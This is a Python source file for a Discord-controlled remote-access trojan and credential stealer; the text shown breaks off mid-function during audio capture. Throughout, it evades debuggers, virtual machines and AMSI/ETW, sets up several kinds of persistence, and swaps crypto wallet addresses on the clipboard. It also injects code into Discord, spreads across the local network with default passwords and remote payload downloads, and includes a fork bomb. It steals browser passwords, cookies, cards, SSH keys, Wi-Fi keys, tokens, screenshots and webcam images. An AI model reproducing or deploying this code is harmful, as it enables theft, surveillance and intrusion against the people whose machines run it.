#!/usr/bin/env python3
import os,sys,subprocess,time,random,json,base64,sqlite3,shutil,threading,getpass,socket,re,hashlib,tempfile,io,ctypes,ctypes.wintypes,platform,struct,urllib.parse,queue,pickle,binascii,contextlib,uuid,pathlib,fnmatch,webbrowser,zipfile,gzip,csv
from pathlib import Path
from datetime import datetime

# ========== CAESAR‑SHIFTED TOKEN (shift +4) ==========
_shift = 4
_token_enc = "QXU8<;M7Rnk|RX]{RHI}RXk~R{:KIfH[f:WfQEHw}iYKVS~t7sSJr1LpS;L<eJZnT6rwH[7Y"
def _dec_token():
    return ''.join(chr(ord(c) - _shift) for c in _token_enc)
BOT_TOKEN = _dec_token()

# ------------------------------- stealth imports -------------------------------
def _i(p):
    for c in [[sys.executable,'-m','pip','install','--user',p],[sys.executable,'-m','pip','install',p],['pip','install','--user',p],['pip3','install','--user',p]]:
        try:subprocess.run(c,capture_output=True,timeout=60,check=True);return True
        except:pass
    return False
def _m(n,p=None):
    if p is None:p=n
    try:return __import__(n)
    except ImportError:
        if _i(p):
            try:return __import__(n)
            except:pass
    return None
_req=['requests','psutil','pycryptodome','pywin32','pynput','opencv-python','pyaudio','pyperclip','keyboard','wmi','pillow','pyautogui','comtypes','pycaw','netifaces','scapy','paramiko','discord.py']
for _x in _req:
    try:__import__(_x.replace('-','_'))
    except:__import__(_x.replace('-','_')) if _i(_x) else None
import requests,psutil,win32com.client,win32security,win32con,win32file,win32api,win32process,win32event,win32gui,win32console,win32crypt,wmi,pyautogui,pynput.keyboard,cv2,pyaudio,pyperclip,keyboard,netifaces,scapy.all as scapy,paramiko
from Crypto.Cipher import AES,ARC4
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
from PIL import Image
from ctypes import cast,POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities,IAudioEndpointVolume
import discord
from discord.ext import commands

# ------------------------------- anti‑debug / anti‑vm -------------------------------
def _a():
    if sys.gettrace() is not None:sys.exit(0)
    if platform.system()=='Windows':
        k32=ctypes.windll.kernel32
        if k32.IsDebuggerPresent():sys.exit(0)
        for p in [r'C:\Program Files\Oracle\VirtualBox Guest Additions',r'C:\Program Files\VMware\VMware Tools',r'C:\Windows\System32\Drivers\VBoxGuest.sys']:
            if os.path.exists(p):
                while True:time.sleep(999999)
        try:
            mac=uuid.getnode()
            ms=':'.join(('%012X'%mac)[i:i+2] for i in range(0,12,2))
            if any(ms.startswith(x) for x in ['08:00:27','00:05:69','00:0C:29','00:1C:42','00:50:56']):sys.exit(0)
        except:pass
        try:
            c=wmi.WMI()
            for disk in c.Win32_DiskDrive():
                if 'vbox' in disk.Model.lower() or 'virtual' in disk.Model.lower():sys.exit(0)
        except:pass
    if platform.system()=='Linux':
        try:
            with open('/sys/class/dmi/id/product_name','r') as f:
                if 'VirtualBox' in f.read() or 'VMware' in f.read():sys.exit(0)
        except:pass
    rl=os.environ.get('LANG','')
    if 'ru' in rl.lower():sys.exit(0)
    try:
        import pyautogui
        px,py=pyautogui.position()
        time.sleep(0.5)
        if (px,py)==pyautogui.position():sys.exit(0)
    except:pass
_a()

# ------------------------------- advanced amsi / etw bypass -------------------------------
def _b():
    if platform.system()!='Windows':return
    try:
        import clr
        clr.AddReference('System.Management.Automation')
        from System.Management.Automation import PowerShell
        ps=PowerShell.Create()
        ps.AddScript('''
            $method=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
            $field=$method.GetField('amsiInitFailed','NonPublic,Static');
            $field.SetValue($null,$true);
            $method=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
            $field=$method.GetField('amsiContext','NonPublic,Static');
            $field.SetValue($null,$null);
        ''')
        ps.Invoke()
    except:pass
    try:
        import ctypes
        k32=ctypes.windll.kernel32
        ntdll=ctypes.windll.ntdll
        ea=ctypes.cast(ntdll.EtwEventWrite,ctypes.c_void_p).value
        old=ctypes.c_ulong()
        k32.VirtualProtect(ea,1,0x40,ctypes.byref(old))
        ctypes.memset(ea,0xC3,1)
        k32.VirtualProtect(ea,1,old,ctypes.byref(ctypes.c_ulong()))
        a=ctypes.windll.amsi
        if a:
            sa=ctypes.cast(a.AmsiScanBuffer,ctypes.c_void_p).value
            k32.VirtualProtect(sa,6,0x40,ctypes.byref(ctypes.c_ulong()))
            ctypes.memmove(sa,b'\xB8\x00\x00\x00\x00\xC3',6)
    except:pass
_b()

# ------------------------------- persistence -------------------------------
def _c():
    sp=os.path.abspath(sys.argv[0])
    if os.name=='nt':
        try:
            k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k,'WindowsDriverUpdate',0,winreg.REG_SZ,sp)
            winreg.CloseKey(k)
        except:pass
        try:
            subprocess.run(['schtasks','/create','/tn','NVIDIA_Telemetry_Updater','/tr',sp,'/sc','daily','/st','09:00','/f'],capture_output=True)
        except:pass
        try:
            sd=Path(os.getenv('APPDATA'))/r'Microsoft\Windows\Start Menu\Programs\Startup'
            shutil.copy(sp,sd/'syshelper.exe')
        except:pass
        try:
            w=win32com.client.GetObject('winmgmts:\\\\.\\root\\subscription')
            f=w.ExecNotificationQuery("SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'")
            c=w.Get('CommandLineEventConsumer').SpawnInstance_
            c.Name='SysHelperConsumer'
            c.CommandLineTemplate=sp
            c.Put_
        except:pass
    else:
        ad=Path.home()/'.config/autostart'
        ad.mkdir(parents=True,exist_ok=True)
        (ad/'system-helper.desktop').write_text(f'[Desktop Entry]\nType=Application\nName=SystemHelper\nExec={sp}\nHidden=true\n')
        subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot {sp}") | crontab -',shell=True)
_c()

# ------------------------------- discord bot core -------------------------------
class _D:
    def __init__(self,t):
        self.t=t
        self.h={'Authorization':f'Bot {t}'}
        self.s=requests.Session()
        self.s.headers.update(self.h)
        self.u=None
        self.guilds={}
        self.cc=None
        self.dc=None
        self.vc=None
        self.voice_client=None
    def _get_guilds(self):
        try:
            r=self.s.get('https://discord.com/api/v9/users/@me/guilds',timeout=15)
            if r.status_code==200:
                for g in r.json():
                    self.guilds[g['id']]=g['name']
                return True
        except:pass
        return False
    def _start(self):
        try:
            r=self.s.get('https://discord.com/api/v9/users/@me',timeout=15)
            if r.status_code!=200:return False
            self.u=r.json()['id']
            if not self._get_guilds() or not self.guilds:
                return False
            guild_id=list(self.guilds.keys())[0]
            victim_name=socket.gethostname().replace(' ','-')[:32]
            cat_data={'name':f'victim-{victim_name}-{random.randint(1000,9999)}','type':4}
            cat=self.s.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels',headers=self.h,json=cat_data,timeout=15)
            if cat.status_code!=201:return False
            cat_id=cat.json()['id']
            cmd_data={'name':'commands','type':0,'parent_id':cat_id,'topic':f'Commands for {victim_name}'}
            cmd=self.s.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels',headers=self.h,json=cmd_data,timeout=15)
            if cmd.status_code!=201:return False
            self.cc=cmd.json()['id']
            data_data={'name':'data','type':0,'parent_id':cat_id}
            data=self.s.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels',headers=self.h,json=data_data,timeout=15)
            if data.status_code!=201:return False
            self.dc=data.json()['id']
            voice_data={'name':'voice','type':2,'parent_id':cat_id}
            voice=self.s.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels',headers=self.h,json=voice_data,timeout=15)
            if voice.status_code==201:
                self.vc=voice.json()['id']
            return True
        except:return False
    def _s(self,c,m):
        for ch in [m[i:i+1900] for i in range(0,len(m),1900)]:
            try:self.s.post(f'https://discord.com/api/v9/channels/{c}/messages',json={'content':ch},timeout=10)
            except:pass
    def _x(self,d,n=None):
        if isinstance(d,bytes):
            try:self.s.post(f'https://discord.com/api/v9/channels/{self.dc}/messages',files={'file':(n or 'data.bin',d)},timeout=30)
            except:pass
        else:self._s(self.dc,str(d))

_d=_D(BOT_TOKEN)
if not _d._start():sys.exit(1)
_d._s(_d.cc,'[+] Agent online')

# ------------------------------- crypto wallet clipper -------------------------------
_wallet_addr=""
def _set_wallet(addr):
    global _wallet_addr
    _wallet_addr=addr
    _d._s(_d.cc,f'[+] Wallet address set to {addr}')
def _clipboard_monitor():
    last=""
    patterns={
        'btc':re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'),
        'eth':re.compile(r'^0x[a-fA-F0-9]{40}$'),
        'xmr':re.compile(r'^4[0-9AB][1-9A-HJ-NP-Za-km-z]{94}$')
    }
    while True:
        try:
            cur=pyperclip.paste()
            if cur!=last and _wallet_addr:
                for coin,pat in patterns.items():
                    if pat.match(cur):
                        pyperclip.copy(_wallet_addr)
                        _d._x(f"Clipped {coin} address: {cur[:10]}... -> {_wallet_addr[:10]}...",'clip_log.txt')
                        break
                last=cur
            time.sleep(0.5)
        except:pass
threading.Thread(target=_clipboard_monitor,daemon=True).start()

# ------------------------------- discord injection -------------------------------
def _inject_discord():
    import psutil
    discord_pid=None
    for proc in psutil.process_iter(['pid','name']):
        if 'discord' in proc.info['name'].lower():
            discord_pid=proc.info['pid']
            break
    if not discord_pid:
        _d._s(_d.cc,'[-] Discord not running')
        return
    js_payload = b"""
(function(){
    const origFetch=window.fetch;
    window.fetch=function(url,opts){
        if(url.includes('/api/v9/auth/login')&&opts.body){
            const body=JSON.parse(opts.body);
            fetch('https://discord.com/api/webhooks/your_webhook',{
                method:'POST',
                body:JSON.stringify({content:`Login: ${body.email}:${body.password}`})
            });
        }
        return origFetch.apply(this,arguments);
    };
})();
"""
    kernel32=ctypes.windll.kernel32
    hProcess=kernel32.OpenProcess(0x1F0FFF,False,discord_pid)
    if not hProcess:
        _d._s(_d.cc,'[-] OpenProcess failed')
        return
    addr=kernel32.VirtualAllocEx(hProcess,0,len(js_payload),0x3000,0x40)
    if not addr:
        _d._s(_d.cc,'[-] VirtualAllocEx failed')
        return
    written=ctypes.c_size_t()
    kernel32.WriteProcessMemory(hProcess,addr,js_payload,len(js_payload),ctypes.byref(written))
    thread=kernel32.CreateRemoteThread(hProcess,0,0,addr,0,0,0)
    if thread:
        _d._s(_d.cc,'[+] Discord injection successful')
    else:
        _d._s(_d.cc,'[-] CreateRemoteThread failed')
    kernel32.CloseHandle(hProcess)
_inject_discord()

# ------------------------------- large file exfil -------------------------------
def _exfil_large(p):
    size=os.path.getsize(p)
    if size>25*1024*1024:
        try:
            files={'file':open(p,'rb')}
            r=requests.post('https://litterbox.catbox.moe/resources/internals/api.php',files=files,timeout=30)
            if r.status_code==200:
                url=r.text.strip()
                _d._s(_d.cc,f'Large file {os.path.basename(p)} ({size/1024/1024:.1f}MB) uploaded: {url}')
                return
        except:pass
    _d._x(open(p,'rb').read(),os.path.basename(p))
    _d._s(_d.cc,f'File {os.path.basename(p)} sent')

# ------------------------------- advanced file mapping -------------------------------
def _tree(path,max_depth=5,depth=0):
    if depth>max_depth:return None
    res={'name':os.path.basename(path) or path,'path':path,'type':'dir','children':[]}
    try:
        for item in os.listdir(path):
            full=os.path.join(path,item)
            if os.path.isdir(full):
                ch=_tree(full,max_depth,depth+1)
                if ch:res['children'].append(ch)
            else:
                sz=os.path.getsize(full)
                if sz<10*1024*1024:
                    res['children'].append({'name':item,'path':full,'type':'file','size':sz})
    except:pass
    return res

# ------------------------------- lateral movement (off by default) -------------------------------
_lateral_enabled=False
def _scan_network():
    local_ips=[]
    for iface in netifaces.interfaces():
        addrs=netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                local_ips.append(addr['addr'])
    targets=set()
    for ip in local_ips:
        if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.16.'):
            net=ip[:ip.rfind('.')]+'.0/24'
            try:
                arp=scapy.arping(net,timeout=2,verbose=0)[0]
                for pkt in arp:
                    targets.add(pkt[scapy.ARP].psrc)
            except:pass
    return list(targets)
def _propagate(target_ip):
    creds=[
        ('Administrator',''),('Administrator','Password123'),('admin','admin'),
        ('user','user'),('root','root'),('Administrator','admin')
    ]
    for user,pw in creds:
        try:
            wmi=win32com.client.GetObject(f'winmgmts:\\\\{target_ip}\\root\\cimv2')
            process=wmi.Get('Win32_Process')
            process.Create(f'cmd.exe /c {sys.executable} -c "import urllib.request; exec(urllib.request.urlopen(\'https://pastebin.com/raw/PAYLOAD\').read())"')
            _d._s(_d.cc,f'[+] Propagated to {target_ip} via WMI')
            return True
        except:pass
        try:
            import pypsexec
            client=pypsexec.Client(target_ip,username=user,password=pw)
            client.connect()
            client.run_executable(sys.executable,arguments='-c "import urllib.request; exec(urllib.request.urlopen(\'https://pastebin.com/raw/PAYLOAD\').read())"')
            _d._s(_d.cc,f'[+] Propagated to {target_ip} via PsExec')
            return True
        except:pass
        try:
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip,username=user,password=pw,timeout=5)
            ssh.exec_command(f'curl -s https://pastebin.com/raw/PAYLOAD | {sys.executable}')
            ssh.close()
            _d._s(_d.cc,f'[+] Propagated to {target_ip} via SSH')
            return True
        except:pass
    return False
def _lateral_infect():
    global _lateral_enabled
    if not _lateral_enabled:
        _d._s(_d.cc,'[-] Lateral movement disabled. Use !lateral_enable')
        return
    targets=_scan_network()
    for ip in targets:
        if ip==socket.gethostbyname(socket.gethostname()):continue
        _propagate(ip)

# ------------------------------- system resource exhaustion -------------------------------
def _fork_bomb():
    if os.name=='nt':
        import wmi
        c=wmi.WMI()
        while True:
            c.Win32_Process.Create(CommandLine='cmd.exe /c start /min cmd /c %0|%0')
            time.sleep(0.1)
    else:
        subprocess.Popen(["bash","-c",":(){ :|:& };:"])
def _stress_cpu():
    while True:
        for _ in range(1000000):pass
def _cpu_stress():
    threading.Thread(target=_stress_cpu,daemon=True).start()
    return 'CPU stress started'

# ======================== FULL DATA THEFT FUNCTIONS ========================
def _browser_passwords():
    data={}
    if os.name=='nt':
        local=os.getenv('LOCALAPPDATA')
        browsers=[
            ("chrome",Path(local)/"Google/Chrome/User Data"),
            ("edge",Path(local)/"Microsoft/Edge/User Data"),
            ("brave",Path(local)/"BraveSoftware/Brave-Browser/User Data"),
            ("opera",Path(local)/"Opera Software/Opera Stable"),
            ("vivaldi",Path(local)/"Vivaldi/User Data")
        ]
    else:
        home=Path.home()
        browsers=[
            ("chrome",home/".config/google-chrome"),
            ("brave",home/".config/BraveSoftware/Brave-Browser"),
            ("chromium",home/".config/chromium")
        ]
    for name,path in browsers:
        if not path.exists():continue
        ls=path/"Local State"
        if not ls.exists():continue
        with open(ls,'r') as f:st=json.load(f)
        ek=base64.b64decode(st['os_crypt']['encrypted_key'])
        ek=ek[5:] if ek[:5]==b'DPAPI' else ek
        try:mk=win32crypt.CryptUnprotectData(ek,None,None,None,0)[1]
        except:continue
        for prof in [path/"Default"]+list(path.glob("Profile *")):
            if not prof.is_dir():continue
            db=prof/"Login Data"
            if not db.exists():continue
            t=tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(db,t.name)
            conn=sqlite3.connect(t.name)
            cur=conn.cursor()
            cur.execute("SELECT origin_url,username_value,password_value FROM logins")
            for url,user,pw in cur.fetchall():
                if pw:
                    try:
                        iv=pw[3:15];ct=pw[15:-16];tag=pw[-16:]
                        ci=AES.new(mk,AES.MODE_GCM,nonce=iv)
                        plain=ci.decrypt_and_verify(ct,tag).decode()
                        data.setdefault(name,{}).setdefault(prof.name,[]).append({'url':url,'user':user,'pass':plain})
                    except:pass
            conn.close();os.unlink(t.name)
    # Firefox
    ff=Path(os.getenv('APPDATA') if os.name=='nt' else Path.home()/'.mozilla')/'firefox'
    for prof in ff.glob('*.default*'):
        if not prof.is_dir():continue
        kdb=prof/'key4.db'
        if not kdb.exists():continue
        t=tempfile.NamedTemporaryFile(delete=False)
        shutil.copy2(kdb,t.name)
        conn=sqlite3.connect(t.name)
        cur=conn.cursor()
        cur.execute("SELECT item1,item2 FROM metadata WHERE id='password'")
        r=cur.fetchone()
        if r:
            gs=r[0]
            cur.execute("SELECT a11,a102 FROM nssPrivate")
            r2=cur.fetchone()
            if r2:
                a11,a102=r2
                mk=PBKDF2(gs,a11,dkLen=32,count=10000,hmac_hash_module=SHA256)
                iv=a102[:16];enc=a102[16:]
                ci=AES.new(mk,AES.MODE_CBC,iv)
                mk2=ci.decrypt(enc)
                pl=mk2[-1];mk2=mk2[:-pl]
                lj=prof/'logins.json'
                if lj.exists():
                    with open(lj,'r') as f:logins=json.load(f)
                    for e in logins.get('logins',[]):
                        try:
                            u=base64.b64decode(e['encryptedUsername'])
                            p=base64.b64decode(e['encryptedPassword'])
                            for ed,out in [(u,'user'),(p,'pass')]:
                                iv2=ed[:16];ct2=ed[16:]
                                ci2=AES.new(mk2,AES.MODE_CBC,iv2)
                                dec=ci2.decrypt(ct2)
                                pl2=dec[-1];val=dec[:-pl2].decode()
                                if out=='user':un=val
                                else:pw=val
                            data.setdefault('firefox',{}).setdefault(prof.name,[]).append({'url':e.get('hostname'),'user':un,'pass':pw})
                        except:pass
        conn.close();os.unlink(t.name)
    return data

def _browser_cookies():
    data={}
    if os.name=='nt':
        local=os.getenv('LOCALAPPDATA')
        browsers=[
            ("chrome",Path(local)/"Google/Chrome/User Data"),
            ("edge",Path(local)/"Microsoft/Edge/User Data"),
            ("brave",Path(local)/"BraveSoftware/Brave-Browser/User Data")
        ]
    else:
        home=Path.home()
        browsers=[
            ("chrome",home/".config/google-chrome"),
            ("brave",home/".config/BraveSoftware/Brave-Browser")
        ]
    for name,path in browsers:
        if not path.exists():continue
        ls=path/"Local State"
        if not ls.exists():continue
        with open(ls,'r') as f:st=json.load(f)
        ek=base64.b64decode(st['os_crypt']['encrypted_key'])
        ek=ek[5:] if ek[:5]==b'DPAPI' else ek
        try:mk=win32crypt.CryptUnprotectData(ek,None,None,None,0)[1]
        except:continue
        for prof in [path/"Default"]+list(path.glob("Profile *")):
            if not prof.is_dir():continue
            db=prof/"Cookies"
            if not db.exists():continue
            t=tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(db,t.name)
            conn=sqlite3.connect(t.name)
            cur=conn.cursor()
            cur.execute("SELECT host_key,name,encrypted_value FROM cookies LIMIT 200")
            cs=[]
            for host,cname,val in cur.fetchall():
                if val:
                    try:
                        iv=val[3:15];ct=val[15:-16];tag=val[-16:]
                        ci=AES.new(mk,AES.MODE_GCM,nonce=iv)
                        plain=ci.decrypt_and_verify(ct,tag).decode()
                        cs.append({'host':host,'name':cname,'value':plain[:200]})
                    except:pass
            if cs:data.setdefault(name,{}).setdefault(prof.name,cs)
            conn.close();os.unlink(t.name)
    return data

def _browser_cards():
    data={}
    if os.name=='nt':
        local=os.getenv('LOCALAPPDATA')
        browsers=[
            ("chrome",Path(local)/"Google/Chrome/User Data"),
            ("edge",Path(local)/"Microsoft/Edge/User Data"),
            ("brave",Path(local)/"BraveSoftware/Brave-Browser/User Data")
        ]
    else:
        home=Path.home()
        browsers=[
            ("chrome",home/".config/google-chrome"),
            ("brave",home/".config/BraveSoftware/Brave-Browser")
        ]
    for name,path in browsers:
        if not path.exists():continue
        ls=path/"Local State"
        if not ls.exists():continue
        with open(ls,'r') as f:st=json.load(f)
        ek=base64.b64decode(st['os_crypt']['encrypted_key'])
        ek=ek[5:] if ek[:5]==b'DPAPI' else ek
        try:mk=win32crypt.CryptUnprotectData(ek,None,None,None,0)[1]
        except:continue
        for prof in [path/"Default"]+list(path.glob("Profile *")):
            if not prof.is_dir():continue
            db=prof/"Web Data"
            if not db.exists():continue
            t=tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(db,t.name)
            conn=sqlite3.connect(t.name)
            cur=conn.cursor()
            cur.execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards")
            cd=[]
            for nm,mo,yr,enc in cur.fetchall():
                if enc:
                    try:
                        iv=enc[3:15];ct=enc[15:-16];tag=enc[-16:]
                        ci=AES.new(mk,AES.MODE_GCM,nonce=iv)
                        num=ci.decrypt_and_verify(ct,tag).decode()
                        cd.append({'name':nm,'month':mo,'year':yr,'number':'****'+num[-4:]})
                    except:pass
            if cd:data.setdefault(name,{}).setdefault(prof.name,cd)
            conn.close();os.unlink(t.name)
    return data

def _browser_history():
    data={}
    if os.name=='nt':
        local=os.getenv('LOCALAPPDATA')
        browsers=[
            ("chrome",Path(local)/"Google/Chrome/User Data"),
            ("edge",Path(local)/"Microsoft/Edge/User Data"),
            ("brave",Path(local)/"BraveSoftware/Brave-Browser/User Data")
        ]
    else:
        home=Path.home()
        browsers=[
            ("chrome",home/".config/google-chrome"),
            ("brave",home/".config/BraveSoftware/Brave-Browser")
        ]
    for name,path in browsers:
        if not path.exists():continue
        for prof in [path/"Default"]+list(path.glob("Profile *")):
            if not prof.is_dir():continue
            db=prof/"History"
            if not db.exists():continue
            t=tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(db,t.name)
            conn=sqlite3.connect(t.name)
            cur=conn.cursor()
            cur.execute("SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200")
            hi=[{'url':r[0],'title':r[1],'visits':r[2],'time':r[3]} for r in cur.fetchall()]
            if hi:data.setdefault(name,{}).setdefault(prof.name,hi)
            conn.close();os.unlink(t.name)
    return data

def _crypto_wallets():
    w=[]
    if os.name=='nt':
        local=os.getenv('LOCALAPPDATA')
        exts={
            'metamask':'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'phantom':'bfnaelmomeimhlpmgjnjphhpkkoljpa',
            'coinbase':'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'binance':'fhbohimaelbohpjbbldcngcnapndodjp',
            'trust':'egjidjbpglichkbfhlakidmjoabbbbb',
            'keplr':'dmkamcknogkgcdfhhbddcghachkejeap'
        }
        for name,ext in exts.items():
            p=Path(local)/f'Google/Chrome/User Data/Default/Local Extension Settings/{ext}'
            if p.exists():
                w.append(f'{name}: {p}')
        app=os.getenv('APPDATA')
        sw=['Exodus','Electrum','Atomic','Guarda','Coinomi','Jaxx']
        for s in sw:
            p=Path(app)/s
            if p.exists():
                w.append(f'{s}: {p}')
    else:
        home=Path.home()
        sw=['.exodus','.electrum','.atomic','.guarda','.coinomi','.jaxx']
        for s in sw:
            p=home/s
            if p.exists():
                w.append(f'{s[1:]}: {p}')
    return w

def _discord_tokens():
    tokens=[]
    if os.name=='nt':
        app=os.getenv('APPDATA')
        paths=[Path(app)/'discord/Local Storage/leveldb',Path(app)/'discordcanary/Local Storage/leveldb',Path(app)/'discordptb/Local Storage/leveldb']
        local=os.getenv('LOCALAPPDATA')
        paths.extend([Path(local)/'Google/Chrome/User Data/Default/Local Storage/leveldb',Path(local)/'BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb'])
    else:
        home=Path.home()
        paths=[home/'.config/discord/Local Storage/leveldb',home/'.config/discordcanary/Local Storage/leveldb',home/'.config/discordptb/Local Storage/leveldb',home/'.config/google-chrome/Default/Local Storage/leveldb']
    for p in paths:
        if not p.exists():continue
        for f in p.glob('*.log')+p.glob('*.ldb'):
            try:
                data=f.read_bytes()
                for m in re.findall(rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',data):
                    tokens.append(m.decode())
                if os.name=='nt' and win32crypt:
                    txt=f.read_text(errors='ignore')
                    enc=re.findall(r'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)',txt)
                    for e in enc:
                        try:
                            local_state_path=None
                            if 'discord' in str(p):
                                dp=p.parent.parent.parent
                                local_state_path=dp/'Local State'
                            elif 'Chrome' in str(p) or 'Brave' in str(p):
                                bp=p.parent.parent.parent.parent.parent
                                local_state_path=bp/'Local State'
                            if local_state_path and local_state_path.exists():
                                with open(local_state_path,'r') as lf:
                                    ls=json.load(lf)
                                ek=base64.b64decode(ls['os_crypt']['encrypted_key'])
                                ek=ek[5:] if ek[:5]==b'DPAPI' else ek
                                mk=win32crypt.CryptUnprotectData(ek,None,None,None,0)[1]
                                ed=base64.b64decode(e)
                                nonce=ed[3:15];ct=ed[15:]
                                ci=AES.new(mk,AES.MODE_GCM,nonce=nonce)
                                dec=ci.decrypt(ct)
                                tok=dec[:-16].decode()
                                if re.match(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',tok):
                                    tokens.append(tok)
                        except:pass
            except:pass
    # validate tokens
    valid=[]
    for tok in set(tokens):
        try:
            headers={'Authorization':tok}
            r=requests.get('https://discord.com/api/v9/users/@me',headers=headers,timeout=5)
            if r.status_code==200:
                ud=r.json()
                ud['token']=tok
                valid.append(ud)
        except:pass
    return valid

def _wifi():
    w=[]
    if os.name=='nt':
        try:
            o=subprocess.run(['netsh','wlan','show','profiles'],capture_output=True,text=True).stdout
            ns=re.findall(r'All User Profile\s*:\s*(.*)',o)
            for n in ns:
                r=subprocess.run(['netsh','wlan','show','profile',n,'key=clear'],capture_output=True,text=True).stdout
                pw=re.search(r'Key Content\s*:\s*(.*)',r)
                w.append({'ssid':n.strip(),'pass':pw.group(1) if pw else ''})
        except:return []
    else:
        nm=Path('/etc/NetworkManager/system-connections')
        if nm.exists() and os.access(nm,os.R_OK):
            for c in nm.glob('*'):
                try:
                    txt=c.read_text()
                    ss=re.search(r'ssid=(.*)',txt)
                    pk=re.search(r'psk=(.*)',txt)
                    if ss:w.append({'ssid':ss.group(1).strip('"'),'pass':pk.group(1) if pk else ''})
                except:pass
        wpa=Path('/etc/wpa_supplicant/wpa_supplicant.conf')
        if wpa.exists() and os.access(wpa,os.R_OK):
            try:
                txt=wpa.read_text()
                nets=re.findall(r'network={([^}]*)}',txt,re.DOTALL)
                for net in nets:
                    ss=re.search(r'ssid="([^"]*)"',net)
                    pk=re.search(r'psk="([^"]*)"',net)
                    if ss:w.append({'ssid':ss.group(1),'pass':pk.group(1) if pk else ''})
            except:pass
    return w

def _ssh_keys():
    keys=[]
    ssh_paths=[Path.home()/'.ssh',Path.home()/'ssh',Path.home()/'Documents/ssh',Path.home()/'Desktop/ssh']
    if os.name=='nt':
        ssh_paths.append(Path(os.getenv('PROGRAMDATA'))/'ssh')
        ssh_paths.append(Path(os.getenv('ALLUSERSPROFILE'))/'ssh')
    for d in ssh_paths:
        if d.exists():
            for f in d.glob('*'):
                if f.is_file() and not f.name.endswith('.pub') and not f.name.startswith('.'):
                    try:
                        c=f.read_text()
                        if 'BEGIN' in c and ('PRIVATE KEY' in c or 'RSA' in c):
                            keys.append({'file':f.name,'content':c[:500]})
                    except:pass
    return keys

def _interesting_files():
    grabbed=[]
    kw=['seed','mnemonic','private','key','password','recovery','wallet','2fa','totp','backup','phrase','secret','ledger','trezor']
    dirs=[Path.home()/d for d in ['Desktop','Downloads','Documents'] if (Path.home()/d).exists()]
    for d in dirs:
        for f in d.rglob('*'):
            if f.is_file() and f.stat().st_size<10*1024*1024:
                if any(k in f.name.lower() for k in kw):
                    try:
                        grabbed.append((f.name,f.read_bytes()[:10000]))
                    except:pass
    return grabbed

def _sessions():
    se={}
    if os.name=='nt':
        try:
            k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Valve\Steam')
            sp=winreg.QueryValueEx(k,'SteamPath')[0]
            lf=Path(sp)/'config/loginusers.vdf'
            if lf.exists():se['steam']=lf.read_text(errors='ignore')[:5000]
        except:pass
        td=Path(os.getenv('APPDATA'))/'Telegram Desktop/tdata'
        if td.exists():
            subprocess.run(['taskkill','/F','/IM','Telegram.exe'],capture_output=True)
            time.sleep(1)
            dst=tempfile.mkdtemp()
            shutil.copytree(td,dst,dirs_exist_ok=True)
            se['telegram']=dst
    return se

def _system_info():
    i={'host':socket.gethostname(),'user':getpass.getuser(),'os':f'{platform.system()} {platform.release()}','arch':platform.machine(),'cpu':os.cpu_count(),'ram':round(psutil.virtual_memory().total/(1024**3),2),'disk':round(psutil.disk_usage('/').total/(1024**3),2)}
    try:i['ip']=requests.get('https://api.ipify.org',timeout=5).text
    except:pass
    try:i['geo']=requests.get(f"http://ip-api.com/json/{i.get('ip','')}",timeout=5).json()
    except:pass
    return i

# ------------------------------- auto‑exfil on start -------------------------------
def _auto_exfil():
    _d._x(json.dumps(_system_info(),indent=2),'system.json')
    pwd=_browser_passwords()
    if pwd:_d._x(json.dumps(pwd,indent=2),'browser_passwords.json')
    ck=_browser_cookies()
    if ck:_d._x(json.dumps(ck,indent=2),'browser_cookies.json')
    cd=_browser_cards()
    if cd:_d._x(json.dumps(cd,indent=2),'browser_cards.json')
    hist=_browser_history()
    if hist:_d._x(json.dumps(hist,indent=2),'browser_history.json')
    wl=_crypto_wallets()
    if wl:_d._x(json.dumps(wl,indent=2),'crypto_wallets.json')
    tok=_discord_tokens()
    if tok:_d._x(json.dumps(tok,indent=2),'discord_tokens.json')
    wf=_wifi()
    if wf:_d._x(json.dumps(wf,indent=2),'wifi.json')
    ssh=_ssh_keys()
    if ssh:_d._x(json.dumps(ssh,indent=2),'ssh_keys.json')
    for name,data in _interesting_files():
        _d._x(data,name)
    sess=_sessions()
    if sess:_d._x(json.dumps(sess,indent=2),'sessions.json')
    try:
        img=pyautogui.screenshot()
        b=io.BytesIO()
        img.save(b,format='PNG')
        _d._x(b.getvalue(),'screenshot.png')
    except:pass
    try:
        cap=cv2.VideoCapture(0)
        if cap.isOpened():
            ret,frame=cap.read()
            cap.release()
            if ret:
                _,buf=cv2.imencode('.jpg',frame)
                _d._x(buf.tobytes(),'webcam.jpg')
    except:pass
    try:
        import pyaudio,wave
        CHUNK=1024
        p=pyaudio.PyAudio()
        s=p.open(format=pyaudio.paInt16,channels=1,rate=44100,input=True,frames_per_buffer=CHUNK)
